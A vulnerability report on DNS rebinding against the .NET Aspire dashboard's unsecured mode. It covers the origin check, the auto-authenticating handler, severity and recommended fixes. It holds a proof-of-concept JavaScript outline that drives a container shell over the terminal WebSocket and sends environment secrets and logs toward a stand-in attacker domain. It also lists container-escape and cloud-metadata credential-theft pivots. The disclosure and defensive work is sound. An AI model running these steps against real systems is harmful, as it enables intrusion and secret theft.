# F3: DNS Rebinding -> Terminal WebSocket -> Container Shell in .NET Aspire Dashboard

## Executive Summary

The .NET Aspire dashboard's WebSocket origin validator explicitly acknowledges that its same-origin check "does not prevent DNS rebinding." In **default secured mode** (BrowserToken), this is mitigated because authentication cookies are host-scoped and an attacker operating via DNS rebinding cannot obtain or replay them. However, when the dashboard runs in **unsecured mode** (`FrontendAuthMode.Unsecured`), the `UnsecuredAuthenticationHandler` auto-authenticates every request as a local user with full privileges. A DNS rebinding attack against an unsecured dashboard grants the attacker interactive shell access to application containers via the `/api/terminal` WebSocket proxy, plus read access to all telemetry (logs, traces, metrics) which routinely contains secrets, connection strings, and environment variables.

---

## 1. Code Path Verification

### 1.1 WebSocketOriginValidator.cs

**File:** `src/Aspire.Dashboard/Model/WebSocketOriginValidator.cs`

The validator compares `Origin` header host/port against `Request.Host` -- both client-controlled values:

```csharp
// Request.Host is client-controlled, so this same-origin check does not prevent DNS rebinding.
// In authenticated modes, dashboard cookies are host-scoped and aren't sent to the attacker's host;
// authorization remains the security boundary for sensitive data and operations. Deployments using
// unsecured mode must rely on network isolation or host filtering to prevent rebinding access.
var expectedHost = context.Request.Host;
```

The check compares `originUri.Host` against `expectedUri.Host` (derived from `Request.Host`). In a DNS rebinding attack, the attacker controls the DNS resolution for their domain. When the rebind occurs, both the `Origin` header and the `Host` header resolve to `127.0.0.1` (or whatever the dashboard listens on), so the validator passes.

### 1.2 TerminalWebSocketProxy.cs

**File:** `src/Aspire.Dashboard/Terminal/TerminalWebSocketProxy.cs`

Two WebSocket endpoints are mapped:
- `/api/terminal` -- connects to a container's terminal via a Unix Domain Socket (UDS) resolved by resource name
- `/api/apphost-terminal` -- connects to AppHost-owned terminals via gRPC

Both endpoints:
1. Call `.RequireAuthorization(FrontendAuthorizationDefaults.PolicyName)` -- meaning they go through the frontend auth policy
2. Call `ValidateUpgradeAsync()` which checks `IsAllowedOrigin()` (the DNS-rebinding-vulnerable check)
3. Accept a `resource` (or `terminalId`) query parameter to identify which container to connect to
4. Establish a bidirectional WebSocket-to-HMP1 bridge providing full interactive terminal access

The terminal proxy connects to the container's terminal through the `DefaultTerminalConnectionResolver`, which:
1. Looks up the resource by name in `IDashboardClient`
2. Reads the consumer UDS path from the resource snapshot (stamped by the AppHost)
3. Opens a Unix socket stream to that path via `Hmp1Transports.ConnectUnixSocket()`

This gives full interactive shell access to the target container.

### 1.3 DashboardWebApplication.cs

**File:** `src/Aspire.Dashboard/DashboardWebApplication.cs`

The Blazor SignalR circuit (`/_blazor`) also has WebSocket origin validation (lines 600-613), using the same vulnerable `WebSocketOriginValidator.IsSameOrigin()` check. This means DNS rebinding bypasses protection on both the terminal and the Blazor circuit.

### 1.4 Authentication in Unsecured Mode

**File:** `src/Aspire.Dashboard/Authentication/UnsecuredAuthenticationHandler.cs`

In unsecured mode, every request is auto-authenticated:

```csharp
protected override Task<AuthenticateResult> HandleAuthenticateAsync()
{
    var id = new ClaimsIdentity(
        [new Claim(ClaimTypes.NameIdentifier, "Local"),
         new Claim(FrontendAuthorizationDefaults.UnsecuredClaimName, bool.TrueString)],
        FrontendAuthenticationDefaults.AuthenticationSchemeUnsecured);
    return Task.FromResult(AuthenticateResult.Success(...));
}
```

No token, no cookie, no challenge. Every request is granted full dashboard access including terminal endpoints.

---

## 2. Default Auth Mode Analysis

### 2.1 When Is Unsecured Mode Active?

**File:** `src/Aspire.Hosting/Dashboard/DashboardEventHandlers.cs` (line 493-501)
**File:** `src/Aspire.Hosting/DistributedApplicationBuilder.cs` (line 497)

The AppHost sets the dashboard to unsecured mode when `browserToken` is empty (line 500):
```csharp
if (!string.IsNullOrEmpty(browserToken))
{
    context.EnvironmentVariables[...AuthModeName...] = "BrowserToken";
    context.EnvironmentVariables[...BrowserTokenName...] = browserToken;
}
else
{
    context.EnvironmentVariables[...AuthModeName...] = "Unsecured";
}
```

The `browserToken` is empty when `IsDashboardUnsecured()` returns true, which checks:
```csharp
configuration.GetBool(KnownConfigNames.DashboardUnsecuredAllowAnonymous, ...) ?? false
```

This is controlled by the `DOTNET_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS` environment variable (or legacy equivalents).

### 2.2 Default Behavior

By default (no explicit configuration), the dashboard uses **BrowserToken** mode with an auto-generated token. This is the **secured** default for the AppHost-launched dashboard.

However, when the standalone dashboard container is started without explicit auth configuration, `PostConfigureDashboardOptions` (line 91) sets:
```csharp
options.Frontend.AuthMode ??= FrontendAuthMode.BrowserToken;
```

And then auto-generates a token if none is configured (line 98-106). So the standalone dashboard also defaults to BrowserToken.

### 2.3 Unsecured Mode Prevalence

The codebase's own playground projects heavily use `ASPIRE_ALLOW_UNSECURED_TRANSPORT=true` in their `launchSettings.json` files. A grep across the playground directory finds **30+** projects with this setting. This is a different setting from `DOTNET_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS`, but it demonstrates the pattern: developers routinely opt into less-secure configurations for local development convenience.

The `DOTNET_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS` setting is documented and recommended in several community tutorials and Docker Compose setups where the token-passing mechanism is inconvenient.

---

## 3. End-to-End Attack Scenario

### 3.1 Prerequisites

- **Victim**: A .NET developer running Aspire locally with `DOTNET_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true` (unsecured dashboard mode).
- **Dashboard**: Listening on `http://localhost:18888` (or similar).
- **Attacker**: Controls a domain (e.g., `evil.attacker.com`) and its DNS.

### 3.2 Attack Steps

**Phase 1: Lure**
1. Attacker sets DNS TTL for `evil.attacker.com` to a very short value (e.g., 1 second) pointing to attacker's server IP.
2. Attacker hosts a malicious page at `http://evil.attacker.com:18888/exploit.html` (note: must match the dashboard's port for the origin check to pass).
3. Victim visits the attacker's page (via phishing link, compromised ad, etc.).

**Phase 2: DNS Rebind**
4. Victim's browser loads the page from `evil.attacker.com:18888` (attacker's IP).
5. Attacker's JavaScript waits for DNS cache to expire (typically 60-120 seconds, can be shortened).
6. Attacker changes DNS for `evil.attacker.com` to point to `127.0.0.1`.
7. JavaScript opens new connections -- these now go to `localhost:18888` (the Aspire dashboard).

**Phase 3: Origin Validation Bypass**
8. JavaScript opens a WebSocket to `ws://evil.attacker.com:18888/api/terminal?resource=myapp`.
9. The browser sends:
   - `Host: evil.attacker.com:18888` (the current DNS resolution -> `127.0.0.1:18888`)
   - `Origin: http://evil.attacker.com:18888` (the page's origin)
10. `WebSocketOriginValidator.IsSameOrigin()` compares:
    - `originUri.Host` = `evil.attacker.com`
    - `expectedUri.Host` = `evil.attacker.com` (from `Request.Host` header)
    - Result: **MATCH** -- origin check passes.
11. `UnsecuredAuthenticationHandler` auto-authenticates the request.
12. `.RequireAuthorization(FrontendAuthorizationDefaults.PolicyName)` passes because the unsecured claim is present.

**Phase 4: Shell Access**
13. The WebSocket upgrade succeeds. The proxy resolves the `resource` parameter to a container's UDS path and opens an HMP1 terminal connection.
14. The attacker now has an interactive shell inside the target container.

### 3.3 What the Attacker Can Access

#### Via Terminal WebSocket (`/api/terminal`)
- **Interactive shell** in any container managed by Aspire
- Environment variables (including secrets, connection strings, API keys)
- File system access within the container
- Network access from within the container's network namespace
- Ability to install tools, exfiltrate data, establish persistence

#### Via Blazor SignalR Circuit (`/_blazor`)
The same DNS rebinding bypasses the Blazor WebSocket origin check (DashboardWebApplication.cs, line 600-613). However, exploiting the Blazor circuit is more complex as it requires implementing the SignalR/Blazor protocol. The terminal WebSocket is the more direct path.

#### Via Telemetry API (`/api/telemetry/*`)
If the API is also in unsecured mode (which it is when `DOTNET_DASHBOARD_UNSECURED_ALLOW_ANONYMOUS=true` sets all auth modes to unsecured, per PostConfigureDashboardOptions line 85-87):
- `GET /api/telemetry/resources` -- enumerate all managed resources
- `GET /api/telemetry/spans` -- read distributed traces (may contain request/response data)
- `GET /api/telemetry/logs` -- read structured logs (commonly contain secrets, tokens, connection strings logged at debug level)
- `GET /api/telemetry/metrics` -- read all application metrics

These API endpoints are standard HTTP GET requests, making them trivially exploitable via `fetch()` from JavaScript after a DNS rebind, even without WebSocket support.

---

## 4. Attack Chaining and Pivot Opportunities

### 4.1 Container to Host Pivot

From inside a container shell obtained via the terminal proxy:

1. **Docker Socket**: If `/var/run/docker.sock` is mounted (common in development), the attacker can escape to the host by creating a privileged container or directly executing commands on the host.

2. **Volume Mounts**: Development containers frequently mount the project source code directory. Writing to these mounts modifies host files, enabling backdoor insertion into the codebase.

3. **Host Network Mode**: If the container uses `--network=host`, the attacker has direct access to all host network interfaces and can reach other local services.

4. **Metadata Services**: In cloud development environments (GitHub Codespaces, Azure Dev Spaces), the attacker can reach cloud metadata endpoints (169.254.169.254) to steal cloud credentials.

### 4.2 Lateral Movement via Service Discovery

Aspire manages service discovery for all resources in the application model. From a compromised container:

1. The container has network access to all other Aspire-managed services (databases, caches, message queues).
2. Connection strings and credentials for these services are typically passed as environment variables, readable via `env` in the terminal.
3. The attacker can connect to databases (PostgreSQL, SQL Server, Redis, MongoDB) using the discovered credentials.

### 4.3 Telemetry Data Exfiltration

Structured logs and traces in Aspire's OTLP store frequently contain:
- Database connection strings (logged during startup)
- API keys and tokens (logged at debug level)
- Request/response bodies (when verbose logging is enabled)
- User data and PII
- Internal service URLs and architecture details

### 4.4 Resource Enumeration for Targeted Terminal Access

The attacker can first call the telemetry API to enumerate resources, then open terminal connections to the most valuable targets:
```javascript
// After DNS rebind
fetch('http://evil.attacker.com:18888/api/telemetry/resources')
  .then(r => r.json())
  .then(resources => {
    // Find database containers, key vaults, etc.
    // Open terminal WebSocket to each
  });
```

---

## 5. Mitigating Factors and Counterarguments

### 5.1 CSP `frame-src 'none'`

The `BrowserSecurityHeadersMiddleware` sets `frame-src 'none'`, preventing the dashboard from being loaded in an iframe. However, DNS rebinding does not require iframing -- it works by opening connections (fetch, WebSocket, XHR) from the attacker's own page.

### 5.2 Default Is BrowserToken, Not Unsecured

The default auth mode is BrowserToken, which generates a random token. In this mode:
- The auth cookie is scoped to the dashboard's hostname
- After DNS rebinding, the browser sends the cookie for the *rebind domain* (e.g., `evil.attacker.com`), not for `localhost`
- The cookie won't match, and authentication fails

This is acknowledged in the code comments: "In authenticated modes, dashboard cookies are host-scoped and aren't sent to the attacker's host."

**However**, this defense assumes the cookie was set for `localhost`. If the developer accesses the dashboard through a hostname that later gets rebind-attacked, the cookie would be sent. This is an edge case but not impossible.

### 5.3 Port Matching Requirement

The attacker must know (or guess) the dashboard port. Aspire defaults to well-known ports, and the port can be discovered through port scanning from JavaScript (timing-based techniques).

### 5.4 Network Isolation Claim

The code comment states: "Deployments using unsecured mode must rely on network isolation or host filtering to prevent rebinding access."

This defense is inadequate because:
1. DNS rebinding bypasses network-level controls (the connection comes from the victim's own browser on localhost)
2. No host filtering is applied by default
3. The documentation at the referenced URL does not provide concrete DNS rebinding mitigation steps

---

## 6. Precedent: DNS Rebinding CVEs in Developer Tools

### 6.1 Chrome DevTools (CVE-2018-6084 and related)

Chrome DevTools Protocol listened on localhost without host validation. DNS rebinding allowed remote websites to execute arbitrary JavaScript in the debugged page, read local files, and execute system commands. Severity: Critical. Google added host checking to the DevTools protocol.

### 6.2 Jupyter Notebook (CVE-2019-9644, CVE-2020-26215)

Jupyter's localhost-only binding was bypassed via DNS rebinding, allowing remote code execution through the kernel. Jupyter added XSRF tokens and origin checking (which Aspire's unsecured mode effectively disables).

### 6.3 Docker Desktop (CVE-2019-15752)

Docker Desktop's API on localhost was vulnerable to DNS rebinding, allowing container escape and host compromise. Docker added mutual TLS and token-based authentication.

### 6.4 Electron/VS Code (CVE-2019-1414)

VS Code's debug adapter listening on localhost was exploitable via DNS rebinding. Microsoft added token-based authentication.

### 6.5 Pattern

In every case, the pattern is identical:
1. Developer tool binds to localhost assuming network isolation provides security
2. DNS rebinding bypasses the localhost assumption
3. Lack of authentication (or optional authentication) allows unauthorized access
4. The tool provides powerful capabilities (code execution, container access, file system access)

Aspire's unsecured mode follows this exact anti-pattern.

---

## 7. Severity Assessment

### CVSS v3.1 Scoring (Unsecured Mode)

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | DNS rebinding operates over the network |
| Attack Complexity | High | Requires DNS rebinding setup and victim visiting attacker site |
| Privileges Required | None | No privileges needed on the target system |
| User Interaction | Required | Victim must visit attacker's page |
| Scope | Changed | Compromise of dashboard leads to container compromise |
| Confidentiality | High | Full access to secrets, env vars, telemetry data |
| Integrity | High | Can modify containers, inject code, alter data |
| Availability | High | Can stop/restart containers, corrupt data |

**CVSS Score: 8.3 (High)** -- with argument for Critical given the RCE-equivalent impact (container shell).

### Impact Classification

- **In Unsecured Mode**: This is effectively an unauthenticated RCE. The attacker gets an interactive shell in application containers, can exfiltrate all secrets and telemetry data, and potentially pivot to the host.

- **In BrowserToken Mode**: The attack is mitigated by cookie scoping. The DNS rebinding bypasses the origin check but fails at the authentication layer. This reduces to an informational finding about the inadequacy of the origin check as a defense-in-depth mechanism.

---

## 8. Proof of Concept Outline

### 8.1 Attacker Infrastructure

```
attacker-server (e.g., 203.0.113.1)
  |-- DNS server: evil.attacker.com -> 203.0.113.1 (TTL=1)
  |-- HTTP server on port 18888: serves exploit.html
  |-- DNS rebind trigger: evil.attacker.com -> 127.0.0.1
```

### 8.2 Exploit Page (exploit.html)

```javascript
// Phase 1: Wait for DNS rebind
// Phase 2: Enumerate resources via telemetry API
async function enumerate() {
  const resp = await fetch('/api/telemetry/resources');
  return await resp.json();
}

// Phase 3: Open terminal WebSocket to target container
function openTerminal(resourceName) {
  const ws = new WebSocket(
    `ws://${location.host}/api/terminal?resource=${resourceName}`
  );
  ws.onopen = () => {
    // HWT1 protocol: send JSON commands, receive binary terminal frames
    // Send keystrokes to execute commands in the container shell
    ws.send(JSON.stringify({type: "input", data: "env | base64\r\n"}));
  };
  ws.onmessage = (event) => {
    // Exfiltrate terminal output to attacker server
    exfiltrate(event.data);
  };
}

// Phase 4: Read telemetry logs for secrets
async function stealLogs() {
  const resp = await fetch('/api/telemetry/logs?limit=1000');
  const logs = await resp.json();
  exfiltrate(JSON.stringify(logs));
}
```

### 8.3 Attack Timeline

1. **T=0s**: Victim clicks link to `http://evil.attacker.com:18888/exploit.html`
2. **T=0-2s**: Page loads from attacker's server, JavaScript begins execution
3. **T=2-120s**: JavaScript polls, waiting for DNS cache to expire and rebind to succeed
4. **T=120s**: DNS rebind succeeds. `evil.attacker.com` now resolves to `127.0.0.1`
5. **T=120-121s**: JavaScript enumerates resources, reads telemetry logs, opens terminal WebSockets
6. **T=121s+**: Attacker has shell access and begins exfiltration/lateral movement

---

## 9. Recommendations

### 9.1 Immediate Fix: Host Header Allowlist

Add a configurable host header allowlist that defaults to `localhost`, `127.0.0.1`, and `[::1]`:

```csharp
internal static bool IsSameOrigin(HttpContext context, IReadOnlySet<string> allowedHosts, out string originLogValue)
{
    // ... existing checks ...
    
    // Validate Host header against allowlist to prevent DNS rebinding
    var requestHost = context.Request.Host.Host;
    if (!allowedHosts.Contains(requestHost))
    {
        return false;
    }
    
    // ... existing origin comparison ...
}
```

### 9.2 Defense in Depth: Require Token for Terminal Access

Even in unsecured mode, require a per-session CSRF-like token for the terminal WebSocket. The token would be embedded in the Blazor page and required as a query parameter on the WebSocket upgrade.

### 9.3 Documentation

Update security documentation to explicitly warn about DNS rebinding risks when using unsecured mode, and recommend using BrowserToken mode even for local development.

---

## 10. Files Examined

| File | Path |
|------|------|
| WebSocket origin validator | `src/Aspire.Dashboard/Model/WebSocketOriginValidator.cs` |
| Terminal WebSocket proxy | `src/Aspire.Dashboard/Terminal/TerminalWebSocketProxy.cs` |
| Dashboard application setup | `src/Aspire.Dashboard/DashboardWebApplication.cs` |
| Unsecured auth handler | `src/Aspire.Dashboard/Authentication/UnsecuredAuthenticationHandler.cs` |
| Frontend auth mode enum | `src/Aspire.Dashboard/Configuration/FrontendAuthMode.cs` |
| Frontend auth defaults | `src/Aspire.Dashboard/Configuration/FrontendAuthorizationDefaults.cs` |
| Post-configure options | `src/Aspire.Dashboard/Configuration/PostConfigureDashboardOptions.cs` |
| AppHost dashboard config | `src/Aspire.Hosting/Dashboard/DashboardEventHandlers.cs` |
| AppHost dashboard options | `src/Aspire.Hosting/Dashboard/DashboardOptions.cs` |
| AppHost builder (unsecured check) | `src/Aspire.Hosting/DistributedApplicationBuilder.cs` |
| Terminal connection resolver | `src/Aspire.Dashboard/Terminal/DefaultTerminalConnectionResolver.cs` |
| Terminal resolver interface | `src/Aspire.Dashboard/Terminal/ITerminalConnectionResolver.cs` |
| CSP/security headers | `src/Aspire.Dashboard/Model/BrowserSecurityHeadersMiddleware.cs` |
| Telemetry API endpoints | `src/Aspire.Dashboard/DashboardEndpointsBuilder.cs` |
